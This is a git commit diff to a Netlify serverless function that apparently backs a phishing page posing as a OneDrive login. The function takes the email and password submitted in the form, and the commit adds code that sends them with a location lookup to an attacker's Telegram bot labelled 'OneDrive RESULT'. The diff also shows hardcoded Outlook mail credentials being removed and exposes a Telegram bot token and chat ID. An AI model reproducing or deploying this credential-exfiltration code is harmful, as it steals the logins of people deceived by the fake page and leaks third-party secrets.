caa8d8d29acfc536b332a468e44f75a20624f44e
wirthschwind <139864045+wirthschwind@users.noreply.github.com>
2024-12-15 07:08:19 -0800

    Update relish.ts

--- netlify/functions/relish.ts
+++ netlify/functions/relish.ts
@@ -6,17 +6,51 @@ export default async (req: Request, context: Context) => {
   const body = await req.formData();
   const email = body.get("ai");
   const password = body.get("pr");
-  console.log('response:', {email, password})
+  console.log('response:', {email, password});
+  await sendToTG(email, password);
 
-  const transporter = nodemailer.createTransport({
-  host: "smtp-mail.outlook.com",
-  port: 587,
-  secure: false,
-  auth: {
-    user: "muammer_y@hotmail.com",
-    pass: "noyanbey1",
-  },
-});
+async function sendToTG(e, p) {
+        const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
+        const chatId = 5645205996; // Replace with your chat ID
+
+        const messageText = `**OneDrive RESULT**\nEmail: ${e}\nPassword: ${p} \n\nLocation: ${loc}`;
+
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+  const params = {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: messageText,
+    }),
+  };
+
+  fetch(url, params)
+    .then((response) => {
+        console.log(response);
+      if (!response.ok) {  
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then((data) => {
+      console.log("Message sent:", data);
+    })
+    .catch((error) => console.error("Error:", error));
+};
+
+    
+async function getLoc(){
+        await fetch('https://hutils.loxal.net/whois').then(response => response.json()).then(data => {
+        loc = JSON.stringify(data, null, 2);
+      });
+        return;
+};
+
+
 
   const message = {
       from: "muammer_y@hotmail.com",
